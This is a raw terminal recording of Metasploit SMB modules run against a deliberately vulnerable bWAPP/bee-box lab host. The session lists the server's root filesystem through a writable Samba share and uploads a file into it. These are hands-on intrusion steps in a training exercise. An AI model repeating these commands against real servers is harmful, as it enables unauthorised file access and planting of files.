+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> exploit 
+[0m[1m[34m[*][0m Running module against 10.10.10.7
+
+[1m[34m[*][0m 10.10.10.7:445 - Connecting to the server...
+[1m[34m[*][0m 10.10.10.7:445 - Mounting the remote share \\10.10.10.7\tmp'...
+[1m[34m[*][0m 10.10.10.7:445 - Listing \\10.10.10.7\tmp\rootfs'...
+[1m[34m[*][0m 10.10.10.7:445 - Directory Listing of \\10.10.10.7\tmp\rootfs
+============================================
+
+  SIZE    TYPE  TIME                   FILENAME
+  ----    ----  ----                   --------
+  1.8 MB  F     2008-04-10 22:04:36PM  vmlinuz
+  0 B     D     2008-04-22 23:04:57PM  opt
+  0 B     D     2008-04-22 23:04:57PM  media
+  0 B     D     2008-04-22 23:04:57PM  initrd
+  0 B     D     2008-04-22 23:04:57PM  srv
+  0 B     D     2013-03-29 00:03:07AM  bin
+  0 B     D     2013-03-29 00:03:57AM  cdrom
+  0 B     D     2013-03-29 00:03:57AM  lost+found
+  0 B     D     2013-03-29 01:03:04AM  usr
+  0 B     D     2013-03-29 01:03:04AM  lib64
+  0 B     D     2013-03-29 01:03:32AM  mnt
+  0 B     D     2013-03-29 01:03:42AM  boot
+  7.1 MB  F     2013-03-29 01:03:42AM  initrd.img
+  0 B     D     2013-03-29 06:03:02AM  sbin
+  0 B     D     2013-04-01 22:04:03PM  lib
+  0 B     D     2013-04-02 02:04:26AM  toolbox
+  0 B     D     2013-12-12 17:12:16PM  home
+  0 B     D     2014-04-19 00:04:09AM  var
+  0 B     D     2020-08-17 23:08:23PM  .
+  0 B     D     2020-08-17 23:08:23PM  ..
+  0 B     D     2020-08-17 23:08:23PM  etc
+  0 B     D     2020-08-17 23:08:23PM  root
+  0 B     D     2020-08-17 23:08:23PM  dev
+  0 B     D     2020-08-18 01:08:14AM  tmp
+  0 B     D     2020-08-18 04:08:40AM  sys
+  0 B     D     2020-08-18 04:08:40AM  proc
+
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> exploit show options [P[P[P[P[Pexploit[Cshow options 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH     rootfs           no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> set rpath rootfs/var
+[0mrpath => rootfs/var
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH     rootfs/var       no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> exploit 
+[0m[1m[34m[*][0m Running module against 10.10.10.7
+
+[1m[34m[*][0m 10.10.10.7:445 - Connecting to the server...
+[1m[34m[*][0m 10.10.10.7:445 - Mounting the remote share \\10.10.10.7\tmp'...
+[1m[34m[*][0m 10.10.10.7:445 - Listing \\10.10.10.7\tmp\rootfs/var'...
+[1m[34m[*][0m 10.10.10.7:445 - Directory Listing of \\10.10.10.7\tmp\rootfs/var
+================================================
+
+  SIZE  TYPE  TIME                   FILENAME
+  ----  ----  ----                   --------
+  0 B   D     2008-03-19 07:03:48AM  agentx
+  0 B   D     2008-04-15 11:04:16AM  local
+  0 B   D     2008-04-22 23:04:16PM  games
+  0 B   D     2008-04-22 23:04:57PM  opt
+  0 B   D     2013-04-14 18:04:43PM  crash
+  0 B   D     2013-07-16 03:07:29AM  spool
+  0 B   D     2014-04-19 00:04:09AM  .
+  0 B   D     2014-05-11 00:05:41AM  cache
+  0 B   D     2014-05-11 00:05:51AM  mail
+  0 B   D     2014-05-12 23:05:35PM  backups
+  0 B   D     2014-11-03 04:11:37AM  www
+  0 B   D     2020-08-17 23:08:23PM  ..
+  0 B   D     2020-08-17 23:08:23PM  tmp
+  0 B   D     2020-08-17 23:08:23PM  lock
+  0 B   D     2020-08-18 00:08:11AM  lib
+  0 B   D     2020-08-18 00:08:11AM  log
+  0 B   D     2020-08-18 01:08:14AM  run
+
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> exploit show options et rpath rootfs/var/www
+[0mrpath => rootfs/var/www
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> e[Kshow p[Koptions 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH     rootfs/var/www   no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> exploit 
+[0m[1m[34m[*][0m Running module against 10.10.10.7
+
+[1m[34m[*][0m 10.10.10.7:445 - Connecting to the server...
+[1m[34m[*][0m 10.10.10.7:445 - Mounting the remote share \\10.10.10.7\tmp'...
+[1m[34m[*][0m 10.10.10.7:445 - Listing \\10.10.10.7\tmp\rootfs/var/www'...
+[1m[34m[*][0m 10.10.10.7:445 - Directory Listing of \\10.10.10.7\tmp\rootfs/var/www
+====================================================
+
+  SIZE    TYPE  TIME                   FILENAME
+  ----    ----  ----                   --------
+  45 B    F     2013-04-02 01:04:10AM  index.bak
+  0 B     D     2014-04-19 00:04:09AM  ..
+  3.5 KB  F     2014-05-11 00:05:41AM  index.lighttpd.html
+  0 B     D     2014-05-11 05:05:11AM  sqlite
+  0 B     D     2014-11-02 21:11:55PM  drupal
+  0.6 KB  F     2014-11-02 23:11:36PM  index.html
+  0 B     D     2014-11-03 04:11:15AM  bWAPP_BAK
+  0 B     D     2014-11-03 04:11:37AM  .
+  200 B   F     2014-11-03 04:11:37AM  crossdomain.xml
+  0 B     D     2014-11-03 04:11:37AM  evil
+  8 KB    F     2014-11-03 04:11:37AM  release_notes.txt
+  325 B   F     2014-11-03 04:11:37AM  ClientAccessPolicy.xml
+  4.8 MB  F     2014-11-03 04:11:37AM  bWAPP_intro.pdf
+  2.5 KB  F     2014-11-03 04:11:37AM  INSTALL.txt
+  0 B     D     2014-11-03 04:11:37AM  bWAPP
+  2.4 KB  F     2014-11-03 04:11:37AM  README.txt
+
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH     rootfs/var/www   no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> use auxiliary/admin/smb/
+use auxiliary/admin/smb/check_dir_file           use auxiliary/admin/smb/psexec_command
+use auxiliary/admin/smb/delete_file              use auxiliary/admin/smb/psexec_ntdsgrab
+use auxiliary/admin/smb/download_file            use auxiliary/admin/smb/samba_symlink_traversal
+use auxiliary/admin/smb/list_directory           use auxiliary/admin/smb/upload_file
+use auxiliary/admin/smb/ms17_010_command         use auxiliary/admin/smb/webexec_command
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> use auxiliary/admin/smb/upload_file 
+[0m[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> ll
+[0m[1m[31m[-][0m Unknown command: ll.
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/upload_file):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   FILE_LPATHS                   no        A file containing a list of local files to utilize
+   FILE_RPATHS                   no        A file containing a list remote files relative to the share to operate on
+   LPATH                         no        The path of the local file to utilize
+   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH                         no        The name of the remote file relative to the share to operate on
+   RPORT        445              yes       The SMB service port (TCP)
+   SMBDomain    .                no        The Windows domain to use for authentication
+   SMBPass                       no        The password for the specified username
+   SMBSHARE     C$               yes       The name of a writeable share on the server
+   SMBUser                       no        The username to authenticate as
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> set rhosts 10.10.10.7
+[0mrhosts => 10.10.10.7
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> set smbshare tmp
+[0msmbshare => tmp
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> set rp
+set rpath  set rport  
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> set rpath rootfs/var/www/
+[0mrpath => rootfs/var/www/
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> set rpath rootfs/var/www/[Kset lpath /home/dinesh/Documents/work/tmp/nc_traffic
+[0mlpath => /home/dinesh/Documents/work/tmp/nc_traffic
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> set lpath /home/dinesh/Documents/work/tmp/nc_traffic[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Prpath rootfs/var/www/[H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> set rpath rootfs/var/www/Interrupt: use the 'exit' command to quit
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> se[K[H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/upload_file):
+
+   Name         Current Setting                             Required  Description
+   ----         ---------------                             --------  -----------
+   FILE_LPATHS                                              no        A file containing a list of local files to utilize
+   FILE_RPATHS                                              no        A file containing a list remote files relative to the share to operate on
+   LPATH        /home/dinesh/Documents/work/tmp/nc_traffic  no        The path of the local file to utilize
+   RHOSTS       10.10.10.7                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH        rootfs/var/www/                             no        The name of the remote file relative to the share to operate on
+   RPORT        445                                         yes       The SMB service port (TCP)
+   SMBDomain    .                                           no        The Windows domain to use for authentication
+   SMBPass                                                  no        The password for the specified username
+   SMBSHARE     tmp                                         yes       The name of a writeable share on the server
+   SMBUser                                                  no        The username to authenticate as
+   THREADS      1                                           yes       The number of concurrent threads (max one per host)
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> exploit 
+[0m
+[1m[34m[*][0m 10.10.10.7:445        - Error: 10.10.10.7: RubySMB::Error::UnexpectedStatusCode STATUS_FILE_IS_A_DIRECTORY
+[1m[34m[*][0m 10.10.10.7:445        - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> exploit show options et lpath /home/dinesh/Documents/work/tmp/nc_traffic[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Prpath rootfs/var/www/nc_traffic.txt
+[0mrpath => rootfs/var/www/nc_traffic.txt
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/upload_file):
+
+   Name         Current Setting                             Required  Description
+   ----         ---------------                             --------  -----------
+   FILE_LPATHS                                              no        A file containing a list of local files to utilize
+   FILE_RPATHS                                              no        A file containing a list remote files relative to the share to operate on
+   LPATH        /home/dinesh/Documents/work/tmp/nc_traffic  no        The path of the local file to utilize
+   RHOSTS       10.10.10.7                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH        rootfs/var/www/nc_traffic.txt               no        The name of the remote file relative to the share to operate on
+   RPORT        445                                         yes       The SMB service port (TCP)
+   SMBDomain    .                                           no        The Windows domain to use for authentication
+   SMBPass                                                  no        The password for the specified username
+   SMBSHARE     tmp                                         yes       The name of a writeable share on the server
+   SMBUser                                                  no        The username to authenticate as
+   THREADS      1                                           yes       The number of concurrent threads (max one per host)
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> exploit 
+[0m
+[1m[34m[*][0m 10.10.10.7:445        - Error: 10.10.10.7: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED
+[1m[34m[*][0m 10.10.10.7:445        - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> exploit show options et rpath rootfs/var/www/nc_traffic.txt[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Knctraffic.txt
+[0mrpath => nctraffic.txt
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> exploit 
+[0m
+[1m[32m[+][0m 10.10.10.7:445        - /home/dinesh/Documents/work/tmp/nc_traffic uploaded to nctraffic.txt
+[1m[34m[*][0m 10.10.10.7:445        - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> use auxiliary/admin/smb/
+use auxiliary/admin/smb/check_dir_file           use auxiliary/admin/smb/psexec_command
+use auxiliary/admin/smb/delete_file              use auxiliary/admin/smb/psexec_ntdsgrab
+use auxiliary/admin/smb/download_file            use auxiliary/admin/smb/samba_symlink_traversal
+use auxiliary/admin/smb/list_directory           use auxiliary/admin/smb/upload_file
+use auxiliary/admin/smb/ms17_010_command         use auxiliary/admin/smb/webexec_command
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> use auxiliary/admin/smb/list_directory 
+[0m[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> l[Kshow options 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH     rootfs/var/www   no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> set rpath 
+[0mrpath => rootfs/var/www
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> set rpath ''
+[0mrpath => 
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> ;[K[H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH                      no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> ;[Kll[K[Kepx[K[Kxploit 
+[0m[1m[34m[*][0m Running module against 10.10.10.7
+
+[1m[34m[*][0m 10.10.10.7:445 - Connecting to the server...
+[1m[34m[*][0m 10.10.10.7:445 - Mounting the remote share \\10.10.10.7\tmp'...
+[1m[34m[*][0m 10.10.10.7:445 - Listing \\10.10.10.7\tmp\'...
+[1m[34m[*][0m 10.10.10.7:445 - Directory Listing of \\10.10.10.7\tmp\
+======================================
+
+  SIZE    TYPE  TIME                   FILENAME
+  ----    ----  ----                   --------
+  0 B     D     2020-08-17 23:08:23PM  ..
+  0 B     D     2020-08-17 23:08:23PM  pulse-bee
+  11 B    F     2020-08-17 23:08:23PM  .X0-lock
+  0 B     D     2020-08-17 23:08:23PM  rootfs
+  0 B     D     2020-08-17 23:08:23PM  .X11-unix
+  118 B   F     2020-08-17 23:08:23PM  .gdmPQC7O0
+  0 B     D     2020-08-17 23:08:23PM  .ICE-unix
+  0 B     D     2020-08-17 23:08:23PM  virtual-bee.HNqBBY
+  0 B     D     2020-08-17 23:08:23PM  keyring-QpY327
+  0 B     D     2020-08-17 23:08:23PM  vmware-root
+  0 B     D     2020-08-17 23:08:23PM  Tracker-bee.7217
+  0 B     D     2020-08-17 23:08:23PM  vmware-bee
+  0 B     D     2020-08-17 23:08:23PM  gconfd-bee
+  11 B    F     2020-08-17 23:08:23PM  .X1-lock
+  0 B     F     2020-08-17 23:08:23PM  tmp.zoWrWc6891
+  0 B     D     2020-08-17 23:08:23PM  .esd-1000
+  0 B     D     2020-08-17 23:08:23PM  seahorse-53LhjG
+  0 B     D     2020-08-17 23:08:23PM  ssh-rSFowk6767
+  0 B     D     2020-08-17 23:08:33PM  orbit-bee
+  0 B     F     2020-08-18 00:08:11AM  php.socket-0
+  0 B     F     2020-08-18 00:08:11AM  php.socket-1
+  0 B     D     2020-08-18 01:08:24AM  .
+  0.7 KB  F     2020-08-18 01:08:24AM  nctraffic.txt
+  0 B     D     2020-08-18 04:08:40AM  VMwareDnD
+
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [0m]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ exit
+
+Script done on 2020-08-18 01:46:25+05:30 [COMMAND_EXIT_CODE="0"]
